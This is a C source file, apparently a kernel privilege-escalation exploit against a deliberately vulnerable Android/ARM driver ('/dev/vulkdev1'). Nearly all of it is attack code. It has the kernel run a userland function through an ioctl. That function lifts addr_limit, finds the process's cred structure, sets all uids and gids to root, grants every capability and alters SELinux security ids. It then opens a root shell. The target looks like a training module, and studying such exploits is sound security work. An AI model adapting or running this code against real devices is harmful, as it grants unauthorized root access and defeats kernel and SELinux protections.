#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define VULKDEV_DEVICE "/dev/vulkdev1"

#define VULDEV_MAGIC 'k'
#define VULDEV_START_CMD    _IOWR(VULDEV_MAGIC, 1, unsigned long*)
#define VULDEV_STOP_CMD     _IO(VULDEV_MAGIC, 2)

#define THREAD_SIZE             8192
#define KERNEL_START            0xc0000000

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;
	/* ... */
};

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};

static inline struct thread_info * current_thread_info(void)
{
	//register unsigned long sp asm ("sp");
	//return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
	register unsigned long reg_sp;
	asm volatile (
	"	mov	%0, sp\n"
	: "=&r" (reg_sp)
	);
	return (struct thread_info *)(reg_sp & ~(THREAD_SIZE - 1));
}

static bool is_cpu_timer_valid(struct list_head *cpu_timer)
{
	if (cpu_timer->next != cpu_timer->prev)
		return false;

	if ((unsigned long int)cpu_timer->next < KERNEL_START)
		return false;

	return true;
}

static void kernel_code(void)
{
	struct thread_info *info;
	struct cred *cred;
	struct task_security_struct *security;
	int i;

	info = current_thread_info();
	info->addr_limit = -1;
	cred = NULL;

	for (i = 0; i < 0x400; i+= 4) {
		struct task_struct_partial *task = ((void *)info->task) + i;

		if (is_cpu_timer_valid(&task->cpu_timers[0])
				&& is_cpu_timer_valid(&task->cpu_timers[1])
				&& is_cpu_timer_valid(&task->cpu_timers[2])
				&& task->real_cred == task->cred) {
			cred = task->cred;
			break;
		}
	}

	if (cred == NULL)
	  return;

	cred->uid = 0;
	cred->gid = 0;
	cred->suid = 0;
	cred->sgid = 0;
	cred->euid = 0;
	cred->egid = 0;
	cred->fsuid = 0;
	cred->fsgid = 0;

	cred->cap_inheritable.cap[0] = 0xffffffff;
	cred->cap_inheritable.cap[1] = 0xffffffff;
	cred->cap_permitted.cap[0] = 0xffffffff;
	cred->cap_permitted.cap[1] = 0xffffffff;
	cred->cap_effective.cap[0] = 0xffffffff;
	cred->cap_effective.cap[1] = 0xffffffff;
	cred->cap_bset.cap[0] = 0xffffffff;
	cred->cap_bset.cap[1] = 0xffffffff;

	security = cred->security;
	if (security) {
		if (security->osid != 0 && security->sid != 0 && security->exec_sid == 0
				&& security->create_sid == 0 && security->keycreate_sid == 0
				&& security->sockcreate_sid == 0) {
			security->osid = 1;
			security->sid = 1;
		}
	}
}

int main(int argc, char* argv[])
{
	int fd;

	fd = open(VULKDEV_DEVICE, O_RDWR|O_NONBLOCK);
	if (fd == -1) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	printf("getuid() = %d\n", getuid());
	printf("ioctl VULDEV_START_CMD, kernel_code = 0x%08lx\n", (unsigned long)kernel_code);
	fsync(0);
	ioctl(fd, VULDEV_START_CMD, kernel_code);
	printf("getuid() = %d\n", getuid());
	if (getuid() == 0)
		system("/system/bin/sh");
	close(fd);
	return 0;
}
